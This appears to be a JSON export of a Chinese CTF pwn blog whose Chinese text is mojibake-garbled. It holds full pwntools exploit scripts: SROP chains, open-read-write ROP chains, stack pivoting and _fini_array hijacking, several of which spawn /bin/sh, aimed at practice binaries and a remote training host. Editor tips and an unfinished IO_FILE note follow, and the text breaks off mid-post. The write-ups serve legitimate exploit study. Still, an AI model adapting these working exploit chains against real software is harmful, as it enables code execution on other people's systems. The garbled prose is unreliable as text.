{"posts":[{"title":"SROPå­¦ä¹ ","content":" æ‡’çš„å†™äº†ï¼Œåæ­£ä¸å¤ªéš¾ï¼Œé‡åˆ°ç›´æ¥æŠ„è¿™ä¿©é¢˜çš„expå°±å¥½äº† smallest å€Ÿç”¨ä¾æ™¨å¸ˆå‚…çš„å †æ ˆå˜åŒ–å›¾ï¼Œæˆ‘æ˜¯æ‡’ç‹— exp: from pwn import * local = 1 binary = &quot;./smallest&quot; if local == 1: p = process(binary) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] dbg() main = 0x4000B0 #skip xor rax,rax is 0x40000B3 syscall_ret = 0x4000BE payload = p64(main) * 3 #the first use to return to send payload(write) # the second use to change the last byte to 'b3' #the third use to return p.send(payload) payload = '\\xb3' #rax = 1 write(1,rsp,0x400) p.send(payload) stack = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) print(&quot;[*]stack:&quot;,hex(stack)) context(arch = 'amd64',os = 'linux') sigframe = SigreturnFrame() sigframe.rax = constants.SYS_read sigframe.rdi = 0 sigframe.rsi = stack sigframe.rdx = 0x400 sigframe.rsp = stack sigframe.rip = syscall_ret payload = p64(main) + p64(0) + str(sigframe) p.send(payload) p.send(p64(syscall_ret) + 7*'\\x00') sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = stack + 0x200 sigframe.rsi = 0 sigframe.rdx = 0 sigframe.rsp = stack sigframe.rip = syscall_ret payload = p64(main) + p64(0) + str(sigframe) final = payload + (0x200 - len(payload)) * '\\x00' + &quot;/bin/sh\\x00&quot; p.send(final) p.send(p64(syscall_ret) + 'hackedy') gdb.attach(p) p.interactive() [V&amp;N2020 å…¬å¼€èµ›]babybabypwn åŠ äº†ä¸ªæ²™ç®± è¿™ä¸ªç›´æ¥ç»™äº†æˆ‘ä»¬ç³»ç»Ÿè°ƒç”¨ï¼Œrt_sigreturn æˆ‘ä»¬ç›´æ¥ç”¨ORWæ‰“å°±è¡Œï¼Œå…ˆç”¨sigreturnè°ƒç”¨readï¼Œåœ¨libcçš„bssæ®µå¸ƒç½®ropé“¾æ‰§è¡Œï¼Œç„¶åå°±è¯»flagå°±å®Œäº‹äº† exp: from pwn import * local = 0 binary = &quot;./vn_pwn_babybabypwn_1&quot; if local == 1: p = process(binary) else: p = remote(&quot;node3.buuoj.cn&quot;,29234) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] context(arch = 'amd64',os = 'linux') libc = ELF('./libc-2.23.so') p.recvuntil('Here is my gift: ') puts = int(p.recv(14),16) libc_base = puts - libc.sym['puts'] print &quot;[*] libc_base:&quot;,hex(libc_base) libc_bss = libc_base + 0x3C5720 read = libc_base + libc.sym['read'] open = libc_base + libc.sym['open'] write = libc_base + libc.sym['write'] sigframe = SigreturnFrame() sigframe.rdi = 0 sigframe.rsi = libc_bss sigframe.rdx = 0x100 sigframe.rip = read sigframe.rsp = libc_bss payload = str(sigframe)[8:] print payload print &quot;payload length:&quot;,len(payload) p.sendafter('Please input magic message: ',payload) pop_rdi_ret = libc_base + 0x0000000000021102 pop_rsi_ret = libc_base + 0x00000000000202e8 pop_rdx_ret = libc_base + 0x0000000000001b92 print hex(pop_rdi_ret) print hex(pop_rsi_ret) print hex(pop_rdx_ret) flag = libc_bss + 152 payload = p64(pop_rdi_ret) + p64(flag) + p64(pop_rsi_ret) + p64(0) + p64(open) payload += p64(pop_rdi_ret) + p64(0x3) + p64(pop_rsi_ret) + p64(libc_bss + 300) + p64(pop_rdx_ret) + p64(0x30) + p64(read) payload += p64(pop_rdi_ret) + p64(0x1) + p64(pop_rsi_ret) + p64(libc_bss + 300) + p64(pop_rdx_ret) + p64(0x30) + p64(write) payload += &quot;flag\\x00&quot; print len(payload) p.send(payload) p.interactive() ","link":"https://l3mon629.github.io/post/srop-xue-xi/"},{"title":"vnæ‹›æ–°èµ›çš„å‰©ä¸‹ä¸¤é“é¢˜ç›®","content":"2020vnæ‹›æ–°çš„æ—¶å€™æˆ‘è¿˜æ²¡æœ‰æ¥è§¦pwnï¼Œå¸Œæœ›åœ¨ä¸ä¹…çš„å°†æ¥èƒ½å¤Ÿè¿½éšmzåŠ å…¥vnï¼Œwtcl orz [V&amp;N2020 å…¬å¼€èµ›]warmup åŠ äº†ä¸ªæ²™ç®±ï¼Œæˆ‘ä»¬æ— æ³•getshellï¼Œå°±ç”¨open read writeæ–¹æ³•æ¥è¯»flagå¥½äº† ç”±äºæ˜¯åœ¨æ ˆä¸Šæ¥å¸ƒç½®ropé“¾ï¼Œæˆ‘ä»¬å°±ä¸ç”¨è¿›è¡Œæ ˆè¿ç§»äº†ï¼Œä½†æ˜¯é¢˜ç›®å¼€äº†pieï¼Œé¢˜ç›®ç»™äº†putsçš„åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”¨libcçš„gadgetä¸€æŠŠæ¢­ exp: from pwn import * #from LibcSearcher import * local = 0 libc = ELF('./libc-2.23.so') binary = &quot;./vn_pwn_warmup&quot; if local == 1: p = process(binary) else: p = remote(&quot;node3.buuoj.cn&quot;,27660) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] p.recvuntil('0x') puts_addr = int(p.recv(12),16) libc_base = puts_addr - libc.sym['puts'] print &quot;[*]libc base:&quot;,hex(libc_base) read = libc_base + libc.sym['read'] write = libc_base + libc.sym['write'] open = libc_base + libc.sym['open'] __free_hook = libc_base + libc.sym['__free_hook'] pop_rdi_ret = libc_base + 0x0000000000021102 pop_rsi_ret = libc_base + 0x00000000000202e8 pop_rdx_ret = libc_base + 0x0000000000001b92 #read(0,__free_hook,0x8) paylaod = p64(0) paylaod += p64(pop_rsi_ret) + p64(__free_hook) paylaod += p64(pop_rdx_ret) + p64(0x8) paylaod += p64(read) #open(__free_hook,0,0) paylaod += p64(pop_rdi_ret) + p64(__free_hook) paylaod += p64(pop_rsi_ret) + p64(0) paylaod += p64(pop_rdx_ret) + p64(0) paylaod += p64(open) #read(0x3,__free_hook,0x30) paylaod += p64(pop_rdi_ret) + p64(0x3) paylaod += p64(pop_rsi_ret) + p64(__free_hook) paylaod += p64(pop_rdx_ret) + p64(0x30) paylaod += p64(read) #write(1,__free_hook,0x30) paylaod += p64(pop_rdi_ret) + p64(0x1) paylaod += p64(pop_rsi_ret) + p64(__free_hook) paylaod += p64(pop_rdx_ret) + p64(0x30) paylaod += p64(write) print(len(paylaod)) #dbg() p.recvuntil('Input something: ') p.send(paylaod) paylaod = 0x78 * 'a' + p64(pop_rdi_ret) p.recvuntil('What\\'s your name?') p.send(paylaod) p.send(&quot;flag&quot;) #gdb.attach(p) p.interactive() ","link":"https://l3mon629.github.io/post/vn-zhao-xin-sai-de-sheng-xia-liang-dao-ti-mu/"},{"title":"sublimeä¸€äº›ä½¿ç”¨æŠ€å·§å’Œç¾åŒ–","content":"ç¾åŒ–ä¸è®°å½•äº†ï¼Œå®˜æ–¹æ–‡æ¡£è¯¦ç»†çš„ä¸€æ‰¹ï¼Œä½†æ˜¯ç€é‡æ¨èä¸€ä¸ªä¸»é¢˜Material Themeï¼ï¼ï¼ è¿™ä¹Ÿå¤ªæ¼‚äº®äº†å…„å¼Ÿé›†ç¾ä»¬ï¼Œéƒ½ç»™æˆ‘è£…ï¼ï¼ https://packagecontrol.io/packages/Material%20Theme ä¸€äº›å¿«æ·é”®ï¼ˆè‡ªå·±å¤ä¹ ç”¨ï¼‰ ctrl + tab:æ ‡ç­¾é¡µåˆ‡æ¢ command + j:åˆå¹¶ä¸‹ä¸€è¡Œ + ] : å‘å³ç¼©è¿› + [ l:é€‰æ‹©å½“å‰è¡Œ å›è½¦:ç›¸å½“äºvimçš„o shift + enter: vim + O æ–¹å‘é”®:ç§»åŠ¨åˆ°æœ€å¤´ shift + æ–¹å‘é”®:ä¸Šè¿°åŠŸèƒ½+é€‰æ‹© shift + p: reindent lines è°ƒæ•´ç¼©ç´§ d:é€‰ä¸­å½“å‰å•è¯ï¼Œä¸€ç›´æŒ‰ä¸‹å»æœ‰å¥‡æ•ˆ /:å¢åŠ æˆ–è€…å–æ¶ˆæ³¨é‡Š option + æ–¹å‘é”®:æŒ‰å•è¯ç§»åŠ¨ ç»‘å®šå¿«æ·é”®ï¼šæ‰“å¼€å‘½ä»¤é¢æ¿ï¼Œæœkey bindingsæ¥ç»‘å®šå¿«æ·é”® ä¸€äº›åŒ…å®‰è£… AdvancedNewFile:æ–°å»ºæ–‡ä»¶åˆ©å™¨ï¼Œè¿˜æœ‰è‡ªåŠ¨è¡¥å…¨ï¼Œæˆ‘çˆ±äº† comman+option+n syncedsidebar:æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨ä¾§è¾¹æ åŒæ­¥æ˜¾ç¤ºï¼Œå¤ªè‰¯å¿ƒäº† å¿«é€Ÿå®šä½æ–‡ä»¶åŠå…¶å†…å®¹ï¼š command + p é™„åŠ  &quot;:&quot; : å®šä½åˆ°è¡Œå· @ : å®šä½åˆ°å‡½æ•°å # : æŸ¥æ‰¾å­—ç¬¦ä¸² æŸ¥æ‰¾åŠŸèƒ½ï¼š command + f æ›¿æ¢ï¼š command + option + f æ–‡ä»¶è·³å›ï¼š ctrl + - è‡ªå®šä¹‰pwn-heapæ¨¡ç‰ˆï¼ˆçˆ½ï¼‰ &lt;snippet&gt; &lt;content&gt;&lt;![CDATA[ from pwn import * local = 1 binary = &quot;${1}&quot; if local == 1: p = process(binary) else: p = remote(&quot;${2}&quot;,${3}) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] def add(size,content): p.sendlineafter('${4}','${5}'') p.sendlineafter('${6}',str(size)) p.sendafter('${7}',content) def show(index): p.sendlineafter('${8}','${9}'') p.sendlineafter('${10}',str(index)) def free(index): p.sendlineafter('${11}','${12}'') p.sendlineafter('${13}',str(index)) def edit(index,content): p.sendlineafter('${14}','${15}'') p.sendlineafter('${16}',str(index)) gdb.attach(p) p.interactive() ]]&gt;&lt;/content&gt; &lt;!-- Optional: Set a tabTrigger to define how to trigger the snippet --&gt; &lt;tabTrigger&gt;pwn-heap&lt;/tabTrigger&gt; &lt;!-- Optional: Set a scope to limit where the snippet will trigger --&gt; &lt;scope&gt;source.python&lt;/scope&gt; &lt;/snippet&gt; ","link":"https://l3mon629.github.io/post/sublime-yi-xie-shi-yong-ji-qiao-he-mei-hua/"},{"title":"æ ˆè¿ç§»æ€»ç»“","content":"æ˜¨å¤©æŸå¸ˆå‚…é—®åˆ°äº†æ ˆè¿ç§»ï¼Œç”±äºèˆå‹éè¦æ‹‰ğŸ‘´å»é€šå®µï¼Œä»Šå¤©ç¡åˆ°ä¸‹åˆå…­ç‚¹æ‰é†’ï¼Œç‰¹æ­¤æ¥æ€»ç»“ä¸‹ æ ˆè¿ç§»å…¶å®ä¸å¤ªéš¾ï¼Œæœ¬åšæ–‡ä¸»è¦æ¥æ€»ç»“ä¸‹æ ˆè¿ç§»çš„å¦™ç”¨ï¼šåŠ«æŒ_fini_array æ ˆè¿ç§» æˆ‘ä»¬å…ˆæ¥æ€»ç»“ä¸‹æ ˆè¿ç§» ä»€ä¹ˆæ˜¯æ ˆè¿ç§»å‘¢ï¼Ÿé¡¾åæ€ä¹‰å°±æ˜¯æŠŠæ ˆè¿ç§»åˆ°äº†å¦å¤–ä¸€ä¸ªåœ°æ–¹ã€‚ é‚£ä¹ˆæˆ‘ä»¬ä»€ä¹ˆæ—¶å€™éœ€è¦æ ˆè¿ç§»å‘¢ï¼Ÿ è®¾æƒ³è¿™æ ·ä¸€ä¸ªæƒ…æ™¯ï¼Œæˆ‘ä»¬å¯ä»¥æº¢å‡ºä¸¤ä¸ªå­—é•¿çš„ç©ºé—´ï¼Œä¸€ä¸ªå­—é•¿ç”¨æ¥è¦†ç›–old bpå¯„å­˜å™¨çš„å€¼ï¼Œä¸€ä¸ªç”¨æ¥æ”¹å†™retè¿”å›åœ°å€ï¼Œä½†æ˜¯ç¨‹åºæ²¡æœ‰åé—¨ï¼Œæˆ‘ä»¬æ— æ³•åˆ©ç”¨ä¸€ä¸ªå­—é•¿æ¥ret2libcï¼Œè¿™ä¸ªæ—¶å€™å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸€ä¸ªåœ°å€æ®µï¼ˆæ¯”å¦‚bssæ®µä¹‹ç±»çš„åœ°æ–¹ï¼‰èƒ½å¤Ÿå†™å…¥å¤§é‡å­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥ret2libcæ¥æ‹¿åˆ°shellï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨æŸä¸ªåœ°å€æ®µå¸ƒç½®å¥½ROPé“¾ï¼Œç„¶ååˆ©ç”¨ä¸¤æ¬¡ leave ret æ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ ä¸€ä¸ª32ä½çš„ä¾‹é¢˜ buuçš„ä¸€é“é¢˜ç›®ï¼Œ[Black Watch å…¥ç¾¤é¢˜]PWN æ¼æ´å‡½æ•°ï¼š æˆ‘ä»¬èƒ½å¤Ÿåœ¨bssæ®µå†™å…¥0x200ä¸ªå­—èŠ‚åŒæ—¶èƒ½å¤Ÿæº¢å‡º8å­—èŠ‚çš„æ•°æ® åˆ©ç”¨å‰æ–‡åˆ†æçš„æ‰‹æ³•ï¼Œä¸éš¾å†™å‡ºexp from pwn import * from LibcSearcher import * binary = './spwn' #libc = ELF('./libc.so.6') local = 0 if local == 1: p = process(binary) else: p = remote('node3.buuoj.cn',25304) elf = ELF(binary) def dbg(): context.log_level = 'debug' #dbg() write_plt = elf.plt['write'] main_addr = elf.sym['main'] read_got = elf.got['read'] pop_ebp = 0 payload = p32(pop_ebp) + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(0x4) # mov esp,ebp; pop ebp; pop eip; p.sendafter('What is your name?',payload) payload = 0x18 * 'a' + p32(0x0804A300) + p32(0x08048511) p.sendafter('What do you want to say?',payload) read_addr = u32(p.recv(4)) print hex(read_addr) libc = LibcSearcher('read',read_addr) libc_base = read_addr - libc.dump('read') system_addr = libc_base + libc.dump('system') binsh_addr = libc_base + libc.dump('str_bin_sh') payload = p32(pop_ebp) + p32(system_addr) + p32(system_addr) + p32(binsh_addr) p.sendafter('What is your name?',payload) payload = 0x18 * 'a' + p32(0x0804A300) + p32(0x08048511) #addr:level p.sendafter('What do you want to say?',payload) p.interactive() åŠ«æŒ_fini_array åŸç†åœ¨è¿™ä¸ªåœ°æ–¹ï¼šhttps://bbs.pediy.com/thread-259298.htm æˆ‘ä»¬ç›´æ¥çœ‹ä¾‹é¢˜ï¼ŒåŸç†å¾ˆç®€å•ï¼Œæˆ‘ä»¬é€šè¿‡ä¾‹é¢˜æ¥è¯¦ç»†è¯´æ˜ä¸€ä¸‹å¦‚ä½•åˆ©ç”¨æ ˆè¿ç§»æ¥åŠ«æŒ_fini_array Memory Monster II é™æ€ç¼–è¯‘çš„é¢˜ç›®ï¼Œæœ‰canary æˆ‘ä»¬é€šè¿‡alt+tæ¥å®šä½åˆ°startå‡½æ•° startå‡½æ•°çš„r8å¯„å­˜å™¨å­˜äº†__libc_csu_finiå‡½æ•°ï¼Œrdiå¯„å­˜å™¨å­˜äº†mainå‡½æ•°åœ°å€ï¼Œæˆ‘ä»¬è·Ÿè¿›å» æœ‰ä»»æ„åœ°å€å†™0x18å­—èŠ‚çš„æ¼æ´ æˆ‘ä»¬å¯ä»¥åŠ«æŒ_fini_array[0]ä¸º__libc_csu_finiå‡½æ•°ï¼Œ_fini_array[1]ä¸ºmainå‡½æ•°ï¼Œåªè¦æˆ‘ä»¬ä¸æ”¹å†™_fini_array[0]ï¼Œæˆ‘ä»¬å°±èƒ½æ‹¥æœ‰ä»»æ„åœ°å€æ— é™å­—èŠ‚å†™å…¥çš„èƒ½åŠ› æ€è·¯å¦‚ä¸‹ï¼š 1ï¼Œæ”¹å†™_fini_arrayï¼Œè·å¾—æ— é™å­—èŠ‚å†™å…¥çš„èƒ½åŠ› 2ï¼Œåœ¨_fini_array + 0x10çš„ä½ç½®å¸ƒç½®ropé“¾ 3ï¼Œæ”¹å†™_fini_array[0]ä¸ºleave retï¼Œ_fini_array[1]ä¸ºretï¼Œä»è€Œè¿›è¡Œæ ˆè¿ç§» è‡³äº2ï¼Œ3æ­¥ä¸ºä»€ä¹ˆå‘¢ï¼Ÿä¸‹é¢æˆ‘ä»¬ç»˜å›¾æ¥ä»”ç»†è¯´æ˜ä¸€ä¸‹ é¦–å…ˆç¬¬ä¸‰æ­¥ï¼Œæˆ‘ä»¬ä¸ºä»€ä¹ˆèƒ½å¤Ÿè¿›è¡Œæ ˆè¿ç§»å‘¢ï¼Œå› ä¸ºåœ¨__libc_csu_finié‡Œé¢æœ‰ä¸€ä¸ªleaæŒ‡ä»¤å¯ä»¥æ”¹å˜rbpçš„å€¼ä¸º_fini_array[0]çš„å€¼ è¯¦ç»†æµç¨‹å¦‚ä¸‹ï¼š åªè¦ç¬¬ä¸‰æ­¥ç†è§£äº†ï¼Œç¬¬äºŒæ­¥å’Œç¬¬ä¸€æ­¥éƒ½ç‰¹åˆ«ç®€å•ï¼Œé€šè¿‡è°ƒç”¨syscallå°±èƒ½æ‹¿shell ç›´æ¥çœ‹expå§ï¼› from pwn import * p = process('./main') def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] __libc_csu_fini = 0x402CB0 _fini_array_0 = 0x4B80B0 _fini_array_1 = 0x4B80B8 target = _fini_array_0 + 0x10 main = 0x401C1D print &quot;================ gadget =================&quot; pop_rax_ret = 0x0000000000448fcc # pop rax ; ret pop_rdi_ret = 0x0000000000401746 # pop rdi ; ret pop_rsi_ret = 0x0000000000406f80 # pop rsi ; ret pop_rdx_ret = 0x0000000000448415 # pop rdx ; ret syscall = 0x0000000000402514 # syscall binsh_addr = 0x0000000000492895 # /bin/sh leave_ret = 0x0000000000401cf3 # leave ; ret ret = 0x0000000000401016 # ret pop_rdx_rsi_ret = 0x000000000044baf9 # pop rdx ; pop rsi ; ret print &quot;================ gadget =================&quot; def change_memory(addr,data): p.recvuntil('addr:') p.sendline(addr) p.recvuntil('data:') p.send(data) print &quot;============= step 1: Get the ability to write infinite address ========&quot; addr = p64(_fini_array_0) payload1 = p64(__libc_csu_fini) + p64(main) change_memory(addr,payload1) print &quot;=========== step 2: Design ROP chain ==========&quot; addr = p64(target) payload2 = p64(pop_rax_ret) + p64(59) change_memory(addr,payload2) addr = p64(target + 0x10) payload3 = p64(pop_rdi_ret) + p64(binsh_addr) change_memory(addr,payload3) addr = p64(target + 0x20) payload4 = p64(pop_rsi_ret) + p64(0) change_memory(addr,payload4) addr = p64(target + 0x30) payload5 = p64(pop_rdx_ret) + p64(0) change_memory(addr,payload5) addr = p64(target + 0x40) payload6 = p64(syscall) change_memory(addr,payload6) print &quot;======== step 3: Stack migration to the rop chain =======&quot; addr = p64(_fini_array_0) payload7 = p64(leave_ret) + p64(ret) change_memory(addr,payload7) p.interactive() ","link":"https://l3mon629.github.io/post/zhan-qian-yi-zong-jie/"},{"title":"vimç¼–è¾‘å™¨","content":"iï¼šå½“å‰å…‰æ ‡å‰é¢æ’å…¥ Iï¼šé¦–è¡Œæ’å…¥ aï¼šå…‰æ ‡åé¢æ’å…¥ Aï¼šå°¾è¡Œæ’å…¥ oï¼šæ¢è¡Œæ’å…¥ Oï¼šåœ¨ä¸Šä¸€è¡Œæ’å…¥ hï¼šå·¦ç§» jï¼šä¸‹ç§» kï¼šä¸Šç§» lï¼šå³ç§» yï¼šå¤åˆ¶å½“å‰å­—ç¬¦ dï¼šå‰ªåˆ‡å½“å‰å­—ç¬¦ ddï¼šå‰ªåˆ‡å½“å‰è¡Œ yyï¼šå¤åˆ¶å½“å‰è¡Œ pï¼šç²˜è´´ cï¼šåˆ æ‰å½“å‰å­—ç¬¦å¹¶è¿›å…¥å†™å…¥æ“ä½œ wï¼šæŠŠå½“å‰å…‰æ ‡ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªè¯ bï¼šæŠŠå½“å‰å…‰æ ‡ç§»åŠ¨åˆ°ä¸Šä¸€ä¸ªè¯ 0ï¼šå›åˆ°è¡Œé¦– /ï¼š/åŠ è¾“å…¥çš„å†…å®¹ï¼Œåœ¨vimä¸­æœç´¢å†…å®¹ fï¼šfindï¼Œfvï¼Œæ‰¾åˆ°vå­—æ¯æ‰€åœ¨ä½ç½® vï¼šè¿›å…¥å¯è§†æ¨¡å¼ Vï¼šæŒ‰è¡Œè¿›å…¥å¯è§†æ¨¡å¼ Gï¼šé€‰ä¸­æœ€åä¸€è¡Œ ggï¼šåˆ°è¡Œé¦– å¾ˆæƒŠäººçš„æ¨¡å¼ï¼šcontrol + vï¼Œè¿›å…¥å¯è§†å—æ¨¡å¼ åˆ†å±ï¼š :splitï¼šä¸Šä¸‹åˆ†å± :vsplitï¼šå·¦å³åˆ†å± :edit+filenameï¼šæ‰“å¼€ä¸€ä¸ªæ–°æ–‡ä»¶ æ€æƒ³ï¼šoperation + motion ( cw change wold ciw change in wold ci&quot; change in &quot;&quot; di&quot; delete in &quot;&quot; df: æ‰¾åˆ°ï¼šä¹‹å‰çš„å†…å®¹å¹¶ä¸”åˆ æ‰ ) åœ¨å®¶ç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ª.vimæ–‡ä»¶å¤¹ï¼Œå»ºç«‹ä¸€ä¸ª.vimrcçš„é…ç½®æ–‡ä»¶å¯ä»¥è‡ªå®šä¹‰å¿«æ·é”® ç®€å•è®°å½•ä¸‹vimé…ç½® let mapleader=&quot; &quot; syntax on noremap &lt;LEADER&gt;&lt;CR&gt; :nohlsearch&lt;CR&gt; set nocompatible filetype on filetype indent on filetype plugin on filetype plugin indent on set mouse=a set encoding=utf-8 let &amp;t_ut='' set expandtab set tabstop=2 set shiftwidth=2 set softtabstop=2 set list set listchars=tab:â–¸\\ ,trail:â–« set scrolloff=5 set tw=0 set indentexpr= set backspace=indent,eol,start set foldmethod=indent set foldlevel=99 let &amp;t_SI = &quot;\\&lt;Esc&gt;]50;CursorShape=1\\x7&quot; let &amp;t_SR = &quot;\\&lt;Esc&gt;]50;CursorShape=2\\x7&quot; let &amp;t_EI = &quot;\\&lt;Esc&gt;]50;CursorShape=0\\x7&quot; set laststatus=2 set autochdir au BufReadPost * if line(&quot;'\\&quot;&quot;) &gt; 1 &amp;&amp; line(&quot;'\\&quot;&quot;) &lt;= line(&quot;$&quot;) | exe &quot;normal! g'\\&quot;&quot; | endif set number set norelativenumber set cursorline set wrap set hlsearch set showcmd set wildmenu set incsearch set ignorecase set smartcase exec &quot;nohlsearch&quot; map S :w&lt;CR&gt; map Q :q&lt;CR&gt; map R :source $MYVIMRC&lt;CR&gt; map sr :set splitright&lt;CR&gt;:vsplit&lt;CR&gt; map sn :set nosplitright&lt;CR&gt;:vsplit&lt;CR&gt; map so :set nosplitbelow&lt;CR&gt;:split&lt;CR&gt; map sb :set splitbelow&lt;CR&gt;:split&lt;CR&gt; map &lt;LEADER&gt;h &lt;C-w&gt;h map &lt;LEADER&gt;j &lt;C-w&gt;j map &lt;LEADER&gt;k &lt;C-w&gt;k map &lt;LEADER&gt;l &lt;C-w&gt;l map &lt;up&gt; :res +5&lt;CR&gt; map &lt;down&gt; :res -5&lt;CR&gt; map &lt;left&gt; :vertical resize -5&lt;CR&gt; map &lt;right&gt; :vertical resize +5&lt;CR&gt; map nt :tabe&lt;CR&gt; map tr :tabnext&lt;CR&gt; map tl :-tabnext&lt;CR&gt; noremap K 5k noremap J 5j noremap H 5h noremap L 5l call plug#begin('~/.vim/plugged') Plug 'vim-airline/vim-airline' Plug 'connorholyday/vim-snazzy' Plug 'scrooloose/nerdtree', { 'on': 'NERDTreeToggle' } Plug 'Xuyuanp/nerdtree-git-plugin' &quot; Taglist Plug 'majutsushi/tagbar', { 'on': 'TagbarOpenAutoClose' } &quot; Error checking Plug 'w0rp/ale' &quot; Auto Complete Plug 'Valloric/YouCompleteMe' &quot; Undo Tree Plug 'mbbill/undotree/' &quot; Other visual enhancement Plug 'nathanaelkane/vim-indent-guides' Plug 'itchyny/vim-cursorword' &quot; Git Plug 'rhysd/conflict-marker.vim' Plug 'tpope/vim-fugitive' Plug 'mhinz/vim-signify' Plug 'gisphm/vim-gitignore', { 'for': ['gitignore', 'vim-plug'] } &quot; HTML, CSS, JavaScript, PHP, JSON, etc. Plug 'elzr/vim-json' Plug 'hail2u/vim-css3-syntax' Plug 'spf13/PIV', { 'for' :['php', 'vim-plug'] } Plug 'gko/vim-coloresque', { 'for': ['vim-plug', 'php', 'html','javascript', 'css', 'less'] } Plug 'pangloss/vim-javascript', { 'for' :['javascript', 'vim-plug'] } Plug 'mattn/emmet-vim' &quot; Python Plug 'vim-scripts/indentpython.vim' &quot; Bookmarks Plug 'kshenoy/vim-signature' &quot; Other useful utilities Plug 'terryma/vim-multiple-cursors' Plug 'junegunn/goyo.vim' &quot; distraction free writing mode Plug 'tpope/vim-surround' &quot; type ysks' to wrap the word with '' or type cs' to change 'word' to `word` Plug 'godlygeek/tabular' &quot; type ;Tabularize /= to align the = Plug 'gcmt/wildfire.vim' &quot; in Visual mode, type i' to select all text in '',or type i) i] i} ip Plug 'scrooloose/nerdcommenter' &quot; in &lt;space&gt;cc to comment a line &quot; Dependencies Plug 'MarcWeber/vim-addon-mw-utils' Plug 'kana/vim-textobj-user' Plug 'fadein/vim-FIGlet' call plug#end() color snazzy let g:SnazzyTransparent = 1 &quot; === &quot; === NERDTree &quot; === map ff :NERDTreeToggle&lt;CR&gt; let NERDTreeMapOpenExpl = &quot;&quot; let NERDTreeMapUpdir = &quot;&quot; let NERDTreeMapUpdirKeepOpen = &quot;l&quot; let NERDTreeMapOpenSplit = &quot;&quot; let NERDTreeOpenVSplit = &quot;&quot; let NERDTreeMapActivateNode = &quot;i&quot; let NERDTreeMapOpenInTab = &quot;o&quot; let NERDTreeMapPreview = &quot;&quot; let NERDTreeMapCloseDir = &quot;n&quot; let NERDTreeMapChangeRoot = &quot;y&quot; &quot; == &quot; == NERDTree-git &quot; == let g:NERDTreeIndicatorMapCustom = { \\ &quot;Modified&quot; : &quot;âœ¹&quot;, \\ &quot;Staged&quot; : &quot;âœš&quot;, \\ &quot;Untracked&quot; : &quot;âœ­&quot;, \\ &quot;Renamed&quot; : &quot;âœ&quot;, \\ &quot;Unmerged&quot; : &quot;â•&quot;, \\ &quot;Deleted&quot; : &quot;âœ–&quot;, \\ &quot;Dirty&quot; : &quot;âœ—&quot;, \\ &quot;Clean&quot; : &quot;âœ”ï¸&quot;, \\ &quot;Unknown&quot; : &quot;?&quot; \\ } &quot; === &quot; === ale &quot; === let b:ale_linters = ['pylint'] let b:ale_fixers = ['autopep8', 'yapf'] &quot; === &quot; === Taglist &quot; === map &lt;silent&gt; T :TagbarOpenAutoClose&lt;CR&gt; &quot; === &quot; === vim-table-mode &quot; === map &lt;LEADER&gt;tm :TableModeToggle&lt;CR&gt; &quot; === &quot; === Python-syntax &quot; === let g:python_highlight_all = 1 &quot; let g:python_slow_sync = 0 &quot; === &quot; === vim-indent-guide &quot; === let g:indent_guides_guide_size = 1 let g:indent_guides_start_level = 2 let g:indent_guides_enable_on_vim_startup = 1 let g:indent_guides_color_change_percent = 1 silent! unmap &lt;LEADER&gt;ig autocmd WinEnter * silent! unmap &lt;LEADER&gt;ig &quot; === &quot; === Goyo &quot; === map &lt;LEADER&gt;gy :Goyo&lt;CR&gt; &quot; === &quot; === vim-signiture &quot; === let g:SignatureMap = { \\ 'Leader' : &quot;m&quot;, \\ 'PlaceNextMark' : &quot;m,&quot;, \\ 'ToggleMarkAtLine' : &quot;m.&quot;, \\ 'PurgeMarksAtLine' : &quot;dm-&quot;, \\ 'DeleteMark' : &quot;dm&quot;, \\ 'PurgeMarks' : &quot;dm/&quot;, \\ 'PurgeMarkers' : &quot;dm?&quot;, \\ 'GotoNextLineAlpha' : &quot;m&lt;LEADER&gt;&quot;, \\ 'GotoPrevLineAlpha' : &quot;&quot;, \\ 'GotoNextSpotAlpha' : &quot;m&lt;LEADER&gt;&quot;, \\ 'GotoPrevSpotAlpha' : &quot;&quot;, \\ 'GotoNextLineByPos' : &quot;&quot;, \\ 'GotoPrevLineByPos' : &quot;&quot;, \\ 'GotoNextSpotByPos' : &quot;mn&quot;, \\ 'GotoPrevSpotByPos' : &quot;mp&quot;, \\ 'GotoNextMarker' : &quot;&quot;, \\ 'GotoPrevMarker' : &quot;&quot;, \\ 'GotoNextMarkerAny' : &quot;&quot;, \\ 'GotoPrevMarkerAny' : &quot;&quot;, \\ 'ListLocalMarks' : &quot;m/&quot;, \\ 'ListLocalMarkers' : &quot;m?&quot; \\ } &quot; === &quot; === Undotree &quot; === let g:undotree_DiffAutoOpen = 0 map L :UndotreeToggle&lt;CR&gt; ","link":"https://l3mon629.github.io/post/vim-bian-ji-qi/"},{"title":"IO_FILEå­¦ä¹ ","content":"å¤ä¹ è¯´æ˜ _IO_FILE_plus ç»“æ„ä½“ï¼šæœ€å…¨é¢çš„ç»“æ„ä½“ extern struct _IO_FILE_plus *_IO_list_all; _IO_list_allï¼š_IO_FILE_plusç±»å‹çš„ä¸€ä¸ªæŒ‡é’ˆ struct _IO_FILE_plus { _IO_FILE file; const struct _IO_jump_t *vtable; }; ç»“æ„ä½“ _IO_FILE_plus ï¼Œå®ƒæœ‰ä¸¤éƒ¨åˆ†ç»„æˆã€‚ åœ¨ç¬¬ä¸€éƒ¨åˆ†ï¼Œ file åœ¨ Linux ç³»ç»Ÿçš„æ ‡å‡† IO 